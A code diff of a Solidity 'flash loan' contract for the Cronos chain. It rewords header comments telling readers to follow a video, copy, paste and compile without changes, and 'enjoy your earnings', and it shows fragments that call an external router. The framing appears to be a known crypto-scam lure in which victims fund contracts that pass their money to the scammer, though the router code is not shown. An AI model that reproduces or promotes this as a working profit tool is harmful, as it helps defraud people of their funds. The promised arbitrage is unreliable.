@@ -1,9 +1,9 @@
-// CRO FLASH LOAN CONTRACT CODE:
+// CRONOS FLASH LOAN CONTRACT CODE:
 
 // Follow carefully the video
-// Do not modify this contract code otherwise it won't work on you!
+// Do not modify the contract code otherwise it might not work and you lose your funds!
 // Just Copy+Paste and Compile!!
-// Thank you for your support! Enjoy your Earnings!!
+// Thank you for the support! Enjoy your Earnings in this market before it stops working!
 
 pragma solidity ^0.5.0;
 
@@ -53,7 +53,7 @@ contract InitiateFlashLoan {
             router.croSwapAddress(),
             flashLoanAmount
         );
-        //To prepare the arbitrage, Cro is converted to Dai using CroDex.
+        //To prepare for the arbitrage, Cro is converted to Dai using CroDex.
         router.convertCroTo(msg.sender, flashLoanAmount / 2);
         //The arbitrage converts token for CRO using token/CRO via CroDex, and then immediately converts CRO back
         router.callArbitrageCroDex(router.croSwapAddress(), msg.sender);
